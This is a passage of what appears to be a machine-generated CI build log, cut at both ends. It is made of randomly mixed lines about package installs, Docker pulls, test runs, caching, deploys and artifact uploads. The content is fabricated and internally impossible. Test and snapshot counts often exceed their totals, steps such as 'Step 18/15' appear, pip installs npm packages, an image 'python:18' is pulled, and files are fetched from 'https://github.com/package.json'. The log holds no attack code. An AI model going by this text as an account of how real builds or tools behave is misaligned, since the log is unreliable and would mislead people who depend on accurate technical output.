4338ms\n[12:47:21] INFO: Request completed\nCache miss for key-1197\nReady.\nCreating production build...\nEnvironment: test\nWARNING: lodash has known vulnerabilities\npip: Downloading axios-2.9.tar.gz\nnpm install: added 330 packages\nInstalling webpack@5.0.0\nAlready up to date.\nStep 2/24: Deploying\nWARNING: jest has known vulnerabilities\nStep 8/24: Running migrations\nArtifact downloaded: 35MB\n[12:47:21] INFO: Request completed\n\u2713 test completed\npip: Installing build dependencies...\nStep 16/22: Building\nGET /health - 201 (85ms)\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9064\nPlatform: darwin-arm64\nFetching from https://gcr.io/package.json\nCompiling utils/utils.go...\nCreating production build...\nReady.\nOptimizing 36 modules...\nStep 13/18: Running migrations\n[12:47:21] WARN: Deprecated API usage\n  PASS: test_db_connect (120ms)\n[12:47:21] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (37MB)\nnpm install: resolved 1129 packages\n\u2713 All checks passed\n[12:47:21] WARN: Deprecated API usage\nOK\nCompiling components/utils.go...\nVerifying...\nWARNING: jest has known vulnerabilities\nArtifact downloaded: 16MB\nnpm notice: package.json updated\nGenerating source maps...\n[12:47:21] INFO: Processing request\nPulling image: node:18\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: alpine:3.11\nPulling image: python:3.11\nBuilding Docker image...\n[12:47:21] DEBUG: Initializing service\n[12:47:21] DEBUG: Loading configuration\n\u2713 All checks passed\nCompiling utils/service.java...\npip: Installing build dependencies...\n[12:47:21] WARN: Deprecated API usage\nCompiling lib/index.js...\nWaiting...\nStep 1/20: Running migrations\nCache miss for key-7458\nTime: 100.332s\n[12:47:21] ERROR: Connection failed\nWaiting...\nCache saved successfully\nWaiting...\nFAILED: test_auth_login\nCoverage: 82% statements, 82% branches\nSnapshots: 49 passed, 41 total\nFAILED: test_db_connect\nStep 17/20: Building\nStep 4/17: Deploying\nnpm notice: package.json updated\nLayer 6/8: COPY command\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@1.17.1\nTests: 178 passed, 254 total\n[12:47:21] INFO: Processing request\nLoading...\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\npip: Downloading eslint-5.7.tar.gz\nWaiting...\nCompiling utils/app.ts...\nStep 1/19: Building\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:21] WARN: Deprecated API usage\nReady.\nUploading artifact 'build' (16 files)\nCompleted.\n\u2713 All checks passed\nnpm notice: created a lockfile\nStep 6/25: Building\n[12:47:21] DEBUG: Loading configuration\nStep 1/20: Deploying\nArtifact uploaded: build.tar.gz (13MB)\nStep 17/24: Deploying\nAlready up to date.\n[12:47:21] INFO: Connecting to database\nPOST /data - 201 (205ms)\nUsing Python 3.12\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-3507\n[12:47:21] INFO: Starting build process\nCreating production build...\nStep 2/20: Linting\nTime: 28.745s\nCompiling utils/utils.go...\nArtifact downloaded: 36MB\nArtifact uploaded: dist.zip (91MB)\nSuccess!\n[12:47:21] DEBUG: Memory usage: 1189MB\nSnapshots: 10 passed, 16 total\nLoading...\nnpm install: resolved 1744 packages\nTransforming 768 files...\n[12:47:21] INFO: Request completed\nCompiling src/app.ts...\nImage pulled successfully\nTest Suites: 48 passed, 27 total\nGenerating source maps...\npip install: Successfully installed express-3.5\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: dist.zip (24MB)\nCreating production build...\nCache saved successfully\nCache invalidated: build\nImage pulled successfully\nArtifact downloaded: 48MB\nMinifying vendor.js\n\u2713 All checks passed\nMinifying app.js\nStep 12/15: Deploying\nArtifact uploaded: build.tar.gz (15MB)\nChecking out main branch\nTLS handshake completed\n[12:47:21] DEBUG: Loading configuration\nBuilding Docker image...\nDone.\nFetching from https://github.com/package.json\n[12:47:21] WARN: Deprecated API usage\nPulling image: python:18\nnpm notice: created a lockfile\nSnapshots: 8 passed, 7 total\nStep 7/21: Installing dependencies\nStep 10/16: Installing dependencies\nStep 9/18: Running migrations\nCache invalidated: node_modules\npip: Collecting eslint\nSwitched to branch 'bugfix/task-560'\npip: Downloading express-2.11.tar.gz\nLayer 2/15: COPY command\nyarn add: Done in 25.72s\nStep 13/18: Installing dependencies\nInstalling express@1.20.1\nStep 2/23: Running migrations\nGET /health - 204 (39ms)\nLayer 4/12: ENV command\nFetching submodules...\npip: Installing build dependencies...\nCache restored successfully (449MB)\nPlatform: win32-x64\npip: Downloading eslint-4.15.tar.gz\nPushing to registry...\n[12:47:21] DEBUG: Loading configuration\nCompiling src/index.js...\nPlatform: win32-x64\nCache saved successfully\nyarn add: Done in 14.86s\n[12:47:21] DEBUG: Loading configuration\nStep 7/19: Building\nTests: 281 passed, 140 total\nArtifact uploaded: dist.zip (46MB)\nLoading...\nCompleted.\nSuccess!\nAlready up to date.\nAlready up to date.\nCompleted.\nBuilding Docker image...\nHEAD is now at 2960c41\nLayer 4/11: RUN command\n[12:47:21] DEBUG: Initializing service\nCreating production build...\n[12:47:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (484ms)\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (47MB)\nSnapshots: 32 passed, 39 total\nArtifact uploaded: build.tar.gz (42MB)\n\u2717 build failed with exit code 75\nEnvironment: development\nProcessing...\nnpm install: added 201 packages\nTransforming 309 files...\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (49MB)\nAlready up to date.\nnpm install: resolved 1712 packages\nException: RuntimeError\n[12:47:21] DEBUG: Query executed in 41ms\nPOST /data - 201 (404ms)\nCoverage: 89% statements, 71% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (42MB)\nAlready up to date.\nChecking out master branch\nyarn add: Done in 17.30s\nStep 4/22: Deploying\nWARNING: prettier has known vulnerabilities\nTests: 298 passed, 121 total\nOK\n\u2713 Task completed in 219ms\nChecking out main branch\nSwitched to branch 'feature/task-374'\nInstalling react@4.1.9\nInstalling express@4.20.8\nCompiling utils/handler.rs...\nHEAD is now at 703ef9d\nLoading...\n[12:47:21] INFO: Processing request\nPlatform: linux-x64\nReady.\npip install: Successfully installed axios-5.6\nException: NullPointerException\nCache saved successfully\nRan 171 tests in 13s\nnpm install: resolved 1188 packages\nStep 11/15: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nTests: 215 passed, 70 total\nCreating production build...\nyarn add: Done in 18.88s\n\u2713 Task completed in 773ms\n\u2713 Task completed in 3085ms\nCompiling src/handler.rs...\nEnvironment: production\n  PASS: test_user_create (239ms)\nNODE_ENV=production\nImage pulled successfully\n\u2713 Step 'install' succeeded\nFetching from https://github.com/package.json\npip install: Successfully installed lodash-5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] DEBUG: Initializing service\nStep 18/15: Testing\n\u2717 build failed with exit code 61\nHEAD is now at 8d2bb85\nnpm notice: package.json updated\nFAILED: test_auth_login\nMinifying main.js\npip: Installing build dependencies...\nTime: 75.251s\n\u2713 Task completed in 4399ms\nStep 14/20: Deploying\nFinished.\npip: Downloading eslint-2.2.tar.gz\n\u2717 build failed with exit code 103\nTLS handshake completed\nCache saved successfully\nWARNING: axios has known vulnerabilities\n[12:47:21] INFO: Processing request\nBundling main.js\nOK\n[12:47:21] INFO: Processing request\nPOST /api - 200 (40ms)\n[12:47:21] WARN: Deprecated API usage\nSuccess!\n[12:47:21] INFO: Connecting to database\nLayer 10/10: ENV command\n[12:47:21] DEBUG: Initializing service\nLoading...\nCompleted.\nnpm notice: package.json updated\nOK\n[12:47:21] INFO: Starting build process\n[12:47:21] INFO: Starting build process\nnpm notice: package.json updated\nArtifact downloaded: 25MB\nLayer 3/8: ENV command\nWaiting...\n[12:47:21] DEBUG: Loading configuration\nGET /api - 200 (49ms)\nCache restored successfully (164MB)\nTransforming 344 files...\nUsing Python 3.9\nFetching from https://docker.io/package.json\nWaiting...\nPOST /upload - 200 (57ms)\n[12:47:21] WARN: Deprecated API usage\nTransforming 526 files...\n[12:47:21] INFO: Processing request\nStep 14/17: Linting\nUsing Node.js 14.10.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:21] WARN: Deprecated API usage\nEnvironment: production\nCache miss for key-8116\nArtifact uploaded: dist.zip (76MB)\nCache invalidated: dependencies\nWaiting...\nCache hit for key-2796\nInstalling lodash@4.15.3\nGET /health - 204 (87ms)\nLoading...\n[12:47:21] DEBUG: Loading configuration\nBuilding Docker image...\n[12:47:21] DEBUG: Memory usage: 385MB\nTests: 193 passed, 210 total\n  PASS: test_cache_hit (248ms)\nCompiling src/service.java...\nEnvironment: development\nUploading artifact 'build' (17 files)\nAlready up to date.\nRan 53 tests in 2s\n[12:47:21] INFO: Request completed\n  PASS: unit/test_api_health.spec.js\n=== Step install_dependencies completed ===\n=== Step: type_check ===\n[12:47:21] INFO: Connecting to database\nStep 20/23: Building\nCache invalidated: dependencies\nTransforming 475 files...\nLayer 8/10: COPY command\n[12:47:21] INFO: Request completed\n\u2713 Task completed in 3929ms\nEnvironment: test\nTime: 45.439s\n[12:47:21] DEBUG: Loading configuration\nStep 5/16: Running migrations\n[12:47:21] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-651'\nFetching submodules...\nPushing to registry...\nCache miss for key-7492\npip install: Successfully installed jest-4.16\nSuccess!\n  PASS: unit/test_auth_login.spec.js\nSnapshots: 3 passed, 9 total\npip: Collecting express\nnpm notice: package.json updated\nSnapshots: 1 passed, 29 total\nOptimizing 19 modules...\nArtifact uploaded: build.tar.gz (8MB)\nStep 12/21: Building\nEnvironment: production\n\u2713 Task completed in 4897ms\nBundling runtime.css\nArtifact downloaded: 21MB\nStep 4/19: Installing dependencies\nSnapshots: 19 passed, 6 total\nInstalling webpack@5.3.8\npip: Downloading prettier-3.18.tar.gz\nTests: 423 passed, 259 total\nPOST /upload - 202 (102ms)\n[12:47:21] WARN: Deprecated API usage\nStep 9/19: Testing\n[12:47:21] INFO: Processing request\nVerifying...\npip install: Successfully installed lodash-1.17\n[12:47:21] INFO: Cache refreshed\nPulling image: node:latest\nCompiling lib/utils.go...\nTest Suites: 24 passed, 33 total\nGET /api - 201 (21ms)\n  PASS: integration/test_auth_login.spec.js\nLoading...\nOK\n[12:47:21] INFO: Starting build process\nCoverage: 100% statements, 77% branches\nWARNING: lodash has known vulnerabilities\nWARNING: axios has known vulnerabilities\n[12:47:21] INFO: Request completed\nArtifact downloaded: 14MB\nStep 7/15: Deploying\n[12:47:21] DEBUG: Connection pool: 14 active\nBundling styles.css\nTests: 129 passed, 454 total\nCoverage: 97% statements, 92% branches\nTime: 18.115s\nSuccess!\n[12:47:21] DEBUG: Connection pool: 9 active\n[12:47:21] INFO: Starting build process\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (86MB)\nCompleted.\nArtifact uploaded: dist.zip (90MB)\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] DEBUG: Query executed in 3ms\n  PASS: test_cache_hit (224ms)\nCache restored successfully (94MB)\nUsing Python 3.9\npip: Downloading axios-2.9.tar.gz\nOK\n[12:47:21] DEBUG: Initializing service\n[12:47:21] WARN: Deprecated API usage\nUsing Node.js 17.11.3\nnpm install: resolved 1477 packages\n[12:47:21] INFO: Cache refreshed\nConnection established\nnpm notice: created a lockfile\nNODE_ENV=test\nFAILED: test_api_health\nStep 10/21: Testing\nBuilding Docker image...\n[12:47:21] INFO: Cache refreshed\nUsing Python 3.12\nUsing Node.js 19.0.2\nBundling vendor.js\nyarn add: Done in 20.56s\nEnvironment: development\n[12:47:21] DEBUG: Query executed in 56ms\nTests: 392 passed, 62 total\nUsing Python 3.9\n[12:47:21] DEBUG: Memory usage: 1349MB\n[12:47:21] INFO: Starting build process\nCompiling lib/app.ts...\nConnection established\nException: ValueError\nReady.\n[12:47:21] DEBUG: Initializing service\nEnvironment: development\nCache hit for key-5255\n[12:47:21] DEBUG: Loading configuration\n[12:47:21] INFO: Processing request\nStep 6/17: Linting\nStep 7/22: Installing dependencies\nConnection established\nTransforming 167 files...\npip: Installing build dependencies...\n\u2713 All checks passed\nStep 18/23: Linting\nStep 2/23: Installing dependencies\nTests: 85 passed, 305 total\nPlatform: linux-x64\n[12:47:21] WARN: Deprecated API usage\nTLS handshake completed\nCache miss for key-3078\nyarn add: Done in 24.82s\nnpm install: added 126 packages\nCompiling components/index.js...\nPlatform: darwin-arm64\nCache invalidated: build\nCompiling utils/index.js...\nConnection established\nCompleted.\nArtifact downloaded: 43MB\nFetching from https://registry.npmjs.org/package.json\nUploading artifact 'dist' (45 files)\npip install: Successfully installed eslint-2.12\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (10MB)\npip install: Successfully installed prettier-2.2\n  PASS: test_auth_login (239ms)\nCoverage: 98% statements, 75% branches\nDone.\n\u2717 build failed with exit code 27\nTest Suites: 49 passed, 15 total\nReady.\nGenerating source maps...\n[12:47:21] INFO: Processing request\n\u2713 Task completed in 2448ms\nImage pulled successfully\nSuccess!\nImage pulled successfully\nProcessing...\n\u2713 All checks passed\nCache miss for key-9764\n[12:47:21] INFO: Connecting to database\n[12:47:21] DEBUG: Query executed in 5ms\nTest Suites: 48 passed, 11 total\nFAILED: test_auth_login\nStep 11/17: Building\nWaiting...\nStep 13/19: Running migrations\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (24MB)\n[12:47:21] DEBUG: Loading configuration\nUsing Node.js 20.0.4\nBundling styles.css\n[12:47:21] INFO: Processing request\nReady.\nPlatform: win32-x64\nStep 12/24: Building\n[12:47:21] INFO: Connecting to database\nnpm notice: created a lockfile\n[12:47:21] DEBUG: Initializing service\nCompiling lib/service.java...\nStep 20/21: Linting\nCoverage: 77% statements, 62% branches\nEnvironment: staging\n[12:47:21] INFO: Processing request\nSnapshots: 31 passed, 14 total\nArtifact uploaded: build.tar.gz (11MB)\nFetching from https://docker.io/package.json\npip: Downloading prettier-2.17.tar.gz\nnpm notice: created a lockfile\nCache hit for key-7286\nWARNING: react has known vulnerabilities\nHEAD is now at 048d16b\nPOST /api - 202 (364ms)\nProcessing...\n[12:47:21] INFO: Cache refreshed\nEnvironment: staging\nUsing Python 3.11\n[12:47:21] DEBUG: Query executed in 34ms\nPulling image: node:latest\nBundling main.css\nStep 7/21: Installing dependencies\nImage pulled successfully\nFAILED: test_api_health\nCache invalidated: build\nUsing Python 3.9\nSnapshots: 27 passed, 4 total\nSwitched to branch 'bugfix/task-414'\nCache saved successfully\nRan 175 tests in 51s\nPlatform: darwin-arm64\npip install: Successfully installed webpack-2.18\nTime: 89.447s\nCoverage: 90% statements, 100% branches\nStep 4/18: Installing dependencies\nUsing Python 3.9\n  PASS: test_user_create (187ms)\nSnapshots: 30 passed, 23 total\nFetching from https://pypi.org/package.json\nOK\n  PASS: test_user_create (69ms)\nPlatform: darwin-arm64\nyarn add: Done in 30.66s\n[12:47:21] INFO: Connecting to database\nTests: 460 passed, 206 total\n[12:47:21] DEBUG: Connection pool: 8 active\n[12:47:21] DEBUG: Connection pool: 11 active\nTime: 106.888s\nCompiling src/service.java...\n[12:47:21] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-480'\nnpm notice: package.json updated\nPulling image: node:latest\n\u2713 Task completed in 3746ms\nPulling image: python:18\nGenerating source maps...\nRan 67 tests in 6s\nPulling image: node:latest\nWaiting...\nPulling image: node:18\nAlready up to date.\nStep 17/25: Running migrations\npip: Collecting react\nCache invalidated: dependencies\nStep 16/25: Running migrations\nOK\nFetching submodules...\nStep 15/24: Building\nWaiting...\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (181ms)\nyarn add: Done in 29.1s\nUsing Python 3.11\nConnection established\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nStep 7/23: Running migrations\n[12:47:21] DEBUG: Memory usage: 832MB\nPOST /api - 202 (59ms)\nTLS handshake completed\n\u2713 Task completed in 2767ms\nUploading artifact 'build' (38 files)\nStep 7/17: Testing\n\u2713 validate completed\nTime: 68.477s\nFinished.\nTest Suites: 36 passed, 38 total\nCompiling src/service.java...\nHEAD is now at 38f4aba\npip install: Successfully installed react-3.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nLoading...\nCreating production build...\npip: Installing build dependencies...\nGET /status - 200 (36ms)\nWARNING: react has known vulnerabilities\n[12:47:21] DEBUG: Loading configuration\nMinifying main.js\nUploading artifact 'build' (44 files)\nFetching from https://githubusercontent.com/package.json\n[12:47:21] WARN: Deprecated API usage\nTests: 402 passed, 139 total\nLoading...\npip: Downloading eslint-3.15.tar.gz\nCache invalidated: node_modules\nLoading...\nBuilding Docker image...\nVerifying...\npip: Downloading prettier-2.13.tar.gz\nRan 195 tests in 12s\nFAILED: test_api_health\nCreating production build...\nImage pulled successfully\nWARNING: express has known vulnerabilities\nInstalling webpack@5.0.8\nMinifying vendor.js\nArtifact uploaded: dist.zip (71MB)\n[12:47:21] DEBUG: Memory usage: 1916MB\nCompiling src/handler.rs...\nOptimizing 54 modules...\n[12:47:21] DEBUG: Query executed in 64ms\nUsing Python 3.12\nnpm notice: package.json updated\nCompleted.\nCache restored successfully (428MB)\nStep 18/15: Installing dependencies\nArtifact uploaded: build.tar.gz (22MB)\npip: Collecting jest\n[12:47:21] DEBUG: Loading configuration\nPulling image: alpine:latest\n[12:47:21] DEBUG: Query executed in 47ms\npip: Installing build dependencies...\nProcessing...\nTest Suites: 20 passed, 46 total\nLayer 3/9: ENV command\nVerifying...\nOptimizing 51 modules...\nStep 11/21: Installing dependencies\n[12:47:21] DEBUG: Connection pool: 8 active\nInstalling react@4.2.9\nArtifact uploaded: build.tar.gz (41MB)\n[12:47:21] INFO: Starting build process\nUploading artifact 'build' (6 files)\nWaiting...\nTransforming 751 files...\nVerifying...\nSuccess!\nUsing Node.js 18.7.8\nStep 11/24: Installing dependencies\nStep 4/15: Running migrations\nArtifact uploaded: build.tar.gz (50MB)\nCompleted.\nStep 12/17: Running migrations\nProcessing...\n[12:47:21] INFO: Request completed\nCoverage: 82% statements, 62% branches\nCache hit for key-3917\nFinished.\npip: Downloading express-2.0.tar.gz\n\u2713 Task completed in 1041ms\nFinished.\nCoverage: 73% statements, 82% branches\n\u2713 build completed\nGET /api - 204 (44ms)\n[12:47:21] DEBUG: Loading configuration\nWaiting...\nStep 10/21: Running migrations\n[12:47:21] INFO: Cache refreshed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (34MB)\nReady.\nSwitched to branch 'feature/task-490'\nUploading artifact 'dist' (13 files)\nPulling image: alpine:3.11\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 77 passed, 177 total\nStep 14/25: Linting\nCompiling src/main.py...\n[12:47:21] ERROR: Connection failed\n  PASS: e2e/test_auth_login.spec.js\nWARNING: jest has known vulnerabilities\nStep 6/24: Deploying\nLayer 7/11: ENV command\nStep 14/20: Linting\nTransforming 100 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: alpine:18\nConnection established\nCompleted.\nPOST /data - 202 (366ms)\n[12:47:21] INFO: Starting build process\nOK\nCompiling utils/handler.rs...\nCoverage: 89% statements, 73% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nUploading artifact 'coverage' (21 files)\n[12:47:21] DEBUG: Loading configuration\nTest Suites: 42 passed, 7 total\n[12:47:21] DEBUG: Query executed in 52ms\nOptimizing 85 modules...\npip: Installing build dependencies...\n[12:47:21] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\n[12:47:21] INFO: Processing request\nFinished.\nConnection established\nCache invalidated: node_modules\nStep 9/15: Running migrations\nStep 17/25: Building\n[12:47:21] ERROR: Connection failed\nStep 15/23: Linting\nPulling image: alpine:3.11\nCache saved successfully\nCompiling lib/service.java...\nCache hit for key-3630\nPOST /data - 202 (224ms)\nStep 13/24: Deploying\n\u2713 Step 'install' succeeded\nFetching from https://amazonaws.com/package.json\nReady.\nBuilding Docker image...\nyarn add: Done in 19.65s\nGenerating source maps...\nCompiling lib/app.ts...\n  PASS: unit/test_cache_hit.spec.js\n\u2713 Task completed in 4155ms\npip: Collecting jest\nArtifact downloaded: 32MB\nFinished.\nPOST /upload - 201 (15ms)\n  PASS: test_db_connect (294ms)\nFinished.\nOptimizing 20 modules...\npip: Installing build dependencies...\nCache restored successfully (427MB)\nnpm install: added 341 packages\n[12:47:21] INFO: Connecting to database\nException: TypeError\nTLS handshake completed\n[12:47:21] DEBUG: Memory usage: 815MB\n\u2713 All checks passed\nSuccess!\nBundling runtime.js\nUsing Node.js 19.4.5\nArtifact uploaded: dist.zip (56MB)\nCache saved successfully\nCache saved successfully\n[12:47:21] INFO: Processing request\nLoading...\nCompiling utils/main.py...\nCache saved successfully\nStep 20/25: Running migrations\nUsing Node.js 19.11.9\n[12:47:21] DEBUG: Memory usage: 248MB\nWaiting...\nStep 8/20: Deploying\nCompleted.\n[12:47:21] INFO: Request completed\nTime: 83.301s\nUsing Python 3.12\nCreating production build...\nArtifact uploaded: build.tar.gz (36MB)\n[12:47:21] DEBUG: Loading configuration\n[12:47:21] WARN: Deprecated API usage\nSnapshots: 22 passed, 43 total\n\u2713 Step 'test' succeeded\npip: Installing build dependencies...\nNODE_ENV=test\nUsing Node.js 15.5.0\nSnapshots: 18 passed, 50 total\nTLS handshake completed\nStep 12/22: Deploying\nOptimizing 46 modules...\nMinifying main.js\nWaiting...\nnpm install: resolved 778 packages\n  PASS: test_api_health (391ms)\n[12:47:21] INFO: Starting build process\n[12:47:21] DEBUG: Initializing service\n[12:47:21] ERROR: Connection failed\nStep 15/21: Testing\nCache miss for key-1040\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:21] WARN: Deprecated API usage\nCache restored successfully (216MB)\nCompiling src/service.java...\nSuccess!\nDone.\n[12:47:21] DEBUG: Loading configuration\n\u2717 build failed with exit code 56\n[12:47:21] DEBUG: Connection pool: 4 active\nHEAD is now at 8745117\n[12:47:21] DEBUG: Loading configuration\nCompleted.\nUsing Node.js 20.19.6\nBundling runtime.js\n[12:47:21] ERROR: Connection failed\nRan 168 tests in 43s\n\u2713 Step 'build' succeeded\nLayer 10/10: RUN command\n[12:47:21] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nAlready up to date.\n[12:47:21] DEBUG: Memory usage: 1519MB\nGET /health - 200 (54ms)\n  PASS: test_cache_hit (229ms)\nCompiling components/app.ts...\nHEAD is now at f37aabd\nArtifact downloaded: 26MB\nnpm install: resolved 1605 packages\n\u2713 Task completed in 1907ms\nWARNING: webpack has known vulnerabilities\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-4495\npip: Installing build dependencies...\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nCache saved successfully\nCache miss for key-6057\n[12:47:21] INFO: Cache refreshed\nMinifying vendor.js\n[12:47:21] INFO: Connecting to database\nNODE_ENV=development\nTime: 18.281s\n\u2717 build failed with exit code 118\nTests: 477 passed, 75 total\n[12:47:21] INFO: Connecting to database\n[12:47:21] INFO: Request completed\nCompiling components/main.py...\nFetching submodules...\n[12:47:21] WARN: Deprecated API usage\npip: Downloading webpack-4.3.tar.gz\n[12:47:21] INFO: Cache refreshed\nyarn add: Done in 4.82s\nOK\nCompiling utils/service.java...\nSnapshots: 36 passed, 44 total\nnpm install: added 33 packages\npip: Installing build dependencies...\n\u2713 All checks passed\n[12:47:21] INFO: Processing request\nyarn add: Done in 30.40s\nCompiling utils/utils.go...\nnpm install: resolved 1601 packages\nNODE_ENV=development\npip: Downloading prettier-3.6.tar.gz\n[12:47:21] INFO: Connecting to database\nOK\nException: ValueError\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] DEBUG: Loading configuration\nCache hit for key-6672\n[12:47:21] INFO: Processing request\nnpm install: added 461 packages\nLoading...\n[12:47:21] ERROR: Connection failed\nStep 8/24: Installing dependencies\n\u2717 build failed with exit code 124\nnpm notice: created a lockfile\n\u2713 package completed\nFetching from https://googleapis.com/package.json\nTLS handshake completed\nFetching submodules...\nStep 2/22: Linting\n[12:47:21] INFO: Processing request\nCache restored successfully (276MB)\nStep 7/24: Running migrations\nnpm notice: created a lockfile\nArtifact downloaded: 22MB\nGenerating source maps...\n[12:47:21] DEBUG: Loading configuration\nStep 7/23: Installing dependencies\nCache hit for key-6165\nReady.\nStep 13/22: Linting\n[12:47:21] DEBUG: Loading configuration\nConnection established\nFetching submodules...\nArtifact downloaded: 27MB\nnpm install: added 124 packages\n[12:47:21] ERROR: Connection failed\nyarn add: Done in 22.76s\nImage pulled successfully\n\u2717 build failed with exit code 118\nCache restored successfully (495MB)\nWARNING: eslint has known vulnerabilities\nCompiling components/main.py...\nCache saved successfully\nMinifying main.js\n  PASS: e2e/test_cache_hit.spec.js\nTransforming 569 files...\nOK\nProcessing...\nTLS handshake completed\nStep 2/22: Running migrations\nnpm notice: package.json updated\nUsing Node.js 19.18.10\n  PASS: unit/test_api_health.spec.js\nCache restored successfully (389MB)\nRan 101 tests in 53s\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: integration/test_auth_login.spec.js\nStep 9/20: Deploying\nTransforming 471 files...\nPOST /data - 200 (213ms)\nAlready up to date.\n[12:47:21] WARN: Deprecated API usage\nSuccess!\nHEAD is now at eab1e00\n[12:47:21] INFO: Cache refreshed\nCompleted.\nTest Suites: 36 passed, 19 total\n[12:47:21] DEBUG: Initializing service\nSnapshots: 32 passed, 30 total\nStep 20/18: Installing dependencies\nPlatform: linux-x64\nGenerating source maps...\nBundling styles.css\nTransforming 980 files...\npip: Installing build dependencies...\n  PASS: integration/test_user_create.spec.js\nCompleted.\nCache miss for key-2563\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nEnvironment: test\n[12:47:21] WARN: Deprecated API usage\nCache restored successfully (249MB)\nTest Suites: 31 passed, 24 total\nUsing Node.js 18.17.6\nStep 20/15: Linting\nEnvironment: development\npip install: Successfully installed lodash-3.13\nCoverage: 86% statements, 96% branches\nCache saved successfully\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: axios has known vulnerabilities\nCompleted.\n\u2713 Task completed in 1651ms\nGenerating source maps...\nCompleted.\n\u2713 Step 'install' succeeded\n[12:47:21] INFO: Connecting to database\n\u2713 build completed\nVerifying...\n\u2713 package completed\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 004917c\nException: ValueError\nPushing to registry...\nArtifact uploaded: dist.zip (88MB)\nVerifying...\nCache miss for key-6114\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nRan 68 tests in 12s\n[12:47:21] INFO: Cache refreshed\nImage pulled successfully\npip: Installing build dependencies...\nCreating production build...\nCache saved successfully\nCache miss for key-2162\nLayer 1/10: RUN command\nTransforming 432 files...\nWaiting...\nPlatform: darwin-arm64\nTest Suites: 49 passed, 33 total\n[12:47:21] INFO: Processing request\nCache invalidated: build\nChecking out main branch\nFAILED: test_db_connect\nStep 7/15: Testing\nPushing to registry...\nnpm notice: created a lockfile\nWaiting...\nMinifying app.js\nCache hit for key-4878\nMinifying vendor.js\nGenerating source maps...\nnpm notice: created a lockfile\nCache miss for key-1173\nCoverage: 77% statements, 95% branches\nWARNING: eslint has known vulnerabilities\nHEAD is now at 1f5bd24\nFetching from https://gcr.io/package.json\nWARNING: react has known vulnerabilities\nEnvironment: development\nNODE_ENV=test\n[12:47:21] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (95MB)\nCompiling lib/service.java...\nStep 4/15: Installing dependencies\n[12:47:21] DEBUG: Loading configuration\nException: NullPointerException\n[12:47:21] DEBUG: Initializing service\nTransforming 266 files...\nWARNING: webpack has known vulnerabilities\nnpm notice: created a lockfile\nException: NullPointerException\n[12:47:21] DEBUG: Initializing service\nCreating production build...\nArtifact downloaded: 41MB\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching from https://pypi.org/package.json\nProcessing...\nWARNING: eslint has known vulnerabilities\nEnvironment: development\nProcessing...\n[12:47:21] INFO: Processing request\nCompiling src/main.py...\nBuilding Docker image...\nMinifying main.js\n[12:47:21] ERROR: Connection failed\nArtifact downloaded: 2MB\n\u2717 build failed with exit code 110\nStep 14/23: Running migrations\nCompleted.\nUploading artifact 'dist' (36 files)\nOptimizing 35 modules...\nInstalling express@2.12.9\n[12:47:21] DEBUG: Memory usage: 1864MB\n\u2717 build failed with exit code 49\nTLS handshake completed\npip: Collecting express\nArtifact uploaded: dist.zip (4MB)\nPlatform: darwin-arm64\n[12:47:21] DEBUG: Query executed in 90ms\nStep 5/17: Linting\n[12:47:21] ERROR: Connection failed\nPlatform: win32-x64\nStep 18/20: Deploying\nnpm install: added 326 packages\nBundling styles.css\npip: Collecting lodash\n[12:47:21] INFO: Processing request\n[12:47:21] INFO: Request completed\nCache restored successfully (45MB)\nFetching from https://githubusercontent.com/package.json\nEnvironment: staging\nAlready up to date.\nStep 12/22: Deploying\n[12:47:21] DEBUG: Loading configuration\n[12:47:21] INFO: Cache refreshed\n\u2717 build failed with exit code 54\n[12:47:21] WARN: Deprecated API usage\nUsing Python 3.10\nInstalling axios@4.5.6\nProcessing...\nCompiling utils/service.java...\nStep 16/19: Deploying\nFAILED: test_cache_hit\nCompiling 